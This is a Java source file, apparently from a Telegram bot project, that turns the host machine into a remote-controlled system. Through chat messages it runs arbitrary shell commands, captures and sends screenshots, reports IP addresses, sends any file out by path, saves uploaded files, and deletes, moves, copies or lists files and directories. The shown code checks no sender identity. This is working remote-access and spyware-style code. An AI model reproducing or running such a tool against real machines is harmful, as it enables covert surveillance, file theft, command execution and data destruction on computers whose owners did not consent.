package monkeyman.home.blog;

import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.GetFile;
import org.telegram.telegrambots.meta.api.methods.send.SendDocument;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.methods.send.SendPhoto;
import org.telegram.telegrambots.meta.api.objects.*;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.ReplyKeyboardMarkup;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardRow;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.io.File;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.Locale;


public class Function {


    public static void SendTextMessage(Update update, String text) throws TelegramApiException {
        if(text.length() < StaticString.BotStatic.maximum_characters-1){
            WorkFlow.bot.execute(new SendMessage(update.getMessage().getChatId(), text));
        }else {
            text = text.substring(0,StaticString.BotStatic.maximum_characters-1);
            WorkFlow.bot.execute(new SendMessage(update.getMessage().getChatId(), text));
        }
    }


    public static void StartCommand(Update update) throws TelegramApiException {


        ArrayList<KeyboardRow> list = new ArrayList<>();

        for(short i=0;i<4;i++) {
            KeyboardRow row = new KeyboardRow();
            if(i==0)row.add(StaticString.BotStatic.StringCommands.Help);
            if(i==1)row.add(StaticString.BotStatic.StringCommands.ScreenShot);
            if(i==2)row.add(StaticString.BotStatic.StringCommands.GetIP);
            if(i==3)row.add(StaticString.BotStatic.StringCommands.Donate);
            list.add(row);
        }

        ReplyKeyboardMarkup markup = new ReplyKeyboardMarkup();
        markup.setKeyboard(list);
        WorkFlow.bot.execute(new SendMessage(update.getMessage().getChatId(),StaticString.BotStatic.Messages.see_below_panel)
                .setReplyMarkup(markup));
    }


    public static void GetIP(Update update) throws TelegramApiException {

        URL whatismyip = null;
        String ip = "not set";
        try {
            whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
            ip = "public IP: "+in.readLine()+"\r\nLocal IP: "+ InetAddress.getLocalHost().getHostAddress();
        } catch (MalformedURLException e) {
            e.printStackTrace();
            WorkFlow.bot.execute(new SendMessage(update.getMessage().getChatId(),e.getMessage().toString()));
        }
        catch (IOException e) {
            e.printStackTrace();
            WorkFlow.bot.execute(new SendMessage(update.getMessage().getChatId(),e.getMessage().toString()));
        }

        WorkFlow.bot.execute(new SendMessage(update.getMessage().getChatId(),ip));

    }



    public static void ScreenShot(Update update) throws TelegramApiException {
        try {
            Robot robot = new Robot();
            BufferedImage screenShot = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ImageIO.write(screenShot, "JPG", new File("screenShot.jpg"));
            SendPhoto photo = new SendPhoto();
            photo.setChatId(update.getMessage().getChatId());
            photo.setPhoto(new File("screenShot.jpg"));
            WorkFlow.bot.execute(photo);

            new File("screenShot.jpg").delete();
        }
        catch(Exception ex){
            ex.printStackTrace();
            WorkFlow.bot.execute(new SendMessage(update.getMessage().getChatId(), ex.getMessage().toString()));
        }
    }
    //---------------------------------------------------------------------------------------------------
    public static void CommandScript(Update update) throws TelegramApiException {
        try {
            String command = update.getMessage().getText();
            command = command.substring(4,command.length());
            System.out.println("CMD:>> "+command);


            if (System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH).indexOf("win")==0)
                command = "cmd.exe /c "+command;

            Process process = Runtime.getRuntime().exec(command);
            InputStream is = process.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));

            String line = null;
            StringBuilder str = new StringBuilder("");
            while ((line = reader.readLine()) != null) {
                str.append(line+"\r\n");
            }

            System.out.println( str.toString());
            Function.SendTextMessage(update, str.toString());

        } catch (IOException e) {
            e.printStackTrace();
            Function.SendTextMessage(update, e.getMessage());
        }
    }



    //--------------------------------------------------------------------------------------------------------
    public static void getFile(Update update, TelegramLongPollingBot bot) throws TelegramApiException {
        try {
            GetFile getFile = new GetFile();
            getFile.setFileId(update.getMessage().getDocument().getFileId());
            org.telegram.telegrambots.meta.api.objects.File file = bot.execute(getFile);




            BufferedInputStream in = new BufferedInputStream(new URL(file.getFileUrl(BotManager.Token)).openStream());
            FileOutputStream fileOutputStream = new FileOutputStream(update.getMessage().getDocument().getFileName());
            byte dataBuffer[] = new byte[1024];
            int seek = 0;
            while ((seek = in.read(dataBuffer, 0, dataBuffer.length)) > -1) {
                fileOutputStream.write(dataBuffer, 0, seek);
            }
            fileOutputStream.flush();
            fileOutputStream.close();

            in.close();
            Function.SendTextMessage(update, StaticString.BotStatic.Messages.Received_and_save);




        }
        catch (Exception ex){ex.printStackTrace();
            Function.SendTextMessage(update,ex.getMessage());
        }
    }


    public static void DeleteAllFile_Dir(Update update) throws TelegramApiException {
        try {
            if (new File(update.getMessage().getText().split(":")[1]).exists()) {
                Files.walk(new File(update.getMessage().getText().split(":")[1]).toPath())
                        .sorted(Comparator.reverseOrder())
                        .map(Path::toFile)
                        .forEach(File::delete);

                Function.SendTextMessage(update, StaticString.BotStatic.Messages.Done);
            }
            else {
                Function.SendTextMessage(update, StaticString.BotStatic.Messages.Directory_not_found);
            }
        } catch (IOException e) {
            e.printStackTrace();
            Function.SendTextMessage(update,e.getMessage());
        }
    }


    public static void DeleteFile(Update update) throws TelegramApiException {
        if(new File(update.getMessage().getText().split(":")[1]).exists())
            if(new File(update.getMessage().getText().split(":")[1]).delete())
                Function.SendTextMessage(update, StaticString.BotStatic.Messages.Done);
            else
                Function.SendTextMessage(update, StaticString.BotStatic.Messages.Error);
        else Function.SendTextMessage(update,StaticString.BotStatic.Messages.File_not_exists);
    }

    public static void MoveFile(Update update) throws TelegramApiException {
        if(new File(update.getMessage().getText().split(":")[1].split("->")[0]).exists()){

            if(new File(update.getMessage().getText().split(":")[1].split("->")[0])
                    .renameTo(new File(update.getMessage().getText().split(":")[1].split("->")[1]))){
                Function.SendTextMessage(update,StaticString.BotStatic.Messages.Done);
            }
            else Function.SendTextMessage(update,StaticString.BotStatic.Messages.Error);

        }else Function.SendTextMessage(update, StaticString.BotStatic.Messages.File_not_exists);
    }


    public static void CopyFile(Update update) throws TelegramApiException, IOException {
        if(new File(update.getMessage().getText().split(":")[1].split("->")[0]).exists()){
            Files.copy(new File(update.getMessage().getText().split(":")[1].split("->")[0]).toPath()
                    ,new File(update.getMessage().getText().split(":")[1].split("->")[1]).toPath(), StandardCopyOption.REPLACE_EXISTING);
            Function.SendTextMessage(update,StaticString.BotStatic.Messages.Done);
        }
        else Function.SendTextMessage(update,StaticString.BotStatic.Messages.File_not_exists);
    }


    public static void Dir(Update update) throws TelegramApiException {
        System.out.println("_"+update.getMessage().getText()+"_");
        String command = update.getMessage().getText();
        command = command.substring(4,command.length());
        if(new File(command).exists()){
            StringBuilder str = new StringBuilder("");
            for(String item : new File(command).list()){
                str.append(item+"\n");
                System.out.println(str.toString());
                if(str.length() > StaticString.BotStatic.maximum_characters-1){
                    Function.SendTextMessage(update,str.toString());
                    str = new StringBuilder("");
                }
            }
            if(str.length() > 0){
                Function.SendTextMessage(update, str.toString());
            }
        }else
            Function.SendTextMessage(update,StaticString.BotStatic.Messages.File_not_exists);
    }



    public static void GetFile(Update update) throws TelegramApiException {
        if (new File(update.getMessage().getText().split(":")[1]).exists()){
            if(new File(update.getMessage().getText().split(":")[1]).isFile()){
                SendDocument document = new SendDocument();
                document.setChatId(update.getMessage().getChatId());
                document.setDocument(new File(update.getMessage().getText().split(":")[1]));
                Function.SendTextMessage(update,StaticString.BotStatic.Messages.wait_send_doc);
                WorkFlow.bot.execute(document);
                Function.SendTextMessage(update,StaticString.BotStatic.Messages.Done);

            }else {
                Function.SendTextMessage(update,StaticString.BotStatic.Messages.is_not_file);
            }
        }
        else {Function.SendTextMessage(update,StaticString.BotStatic.Messages.File_not_exists);}
    }



    public static void help(Update update) throws TelegramApiException {
        StringBuilder str = new StringBuilder("<b>[ Help Menu ]</b>💬\n\n\n");
        str.append("🔘 Functions List :💡\n\n");
        str.append("📎<i>[ Send Shell/Cmd Command ]</i>\n");
        str.append("<b>cmd:net user</b>\n\n");
        str.append("📎<i>[ Get File with full path]</i>\n");
        str.append("<b>get_file:c:\\Users\\admin\\Desktop\\sample.mp3</b>\n\n");
        str.append("📎<i>[ Delete Directory whit All Files ]</i>\n");
        str.append("<b>delete_dir:c:\\Users\\admin\\Desktop\\temp</b>\n\n");
        str.append("📎<i>[ Delete File with full path]</i>\n");
        str.append("<b>delete_file:c:\\Users\\admin\\Desktop\\Sample.mp3</b>\n\n");
        str.append("📎<i>[ Move File src -> des]</i>\n");
        str.append("<b>move:c:\\sample.txt->d:\\archive\\sample.txt</b>\n\n");
        str.append("📎<i>[ Copy File src -> des]</i>\n");
        str.append("<b>copy:c:\\sample.mp3->d:\\sample.mp3</b>\n\n");
        str.append("📎<i>[Get File And Folder List]</i>\n");
        str.append("<b>dir:d:\\Music</b>\n\n");
        str.append("\n\nPower By Ascaris 🐉");

        SendMessage message = new SendMessage();
        message.setChatId(update.getMessage().getChatId());
        message.setText(str.toString());
        message.setParseMode("HTML");
        WorkFlow.bot.execute(message);


    }
}
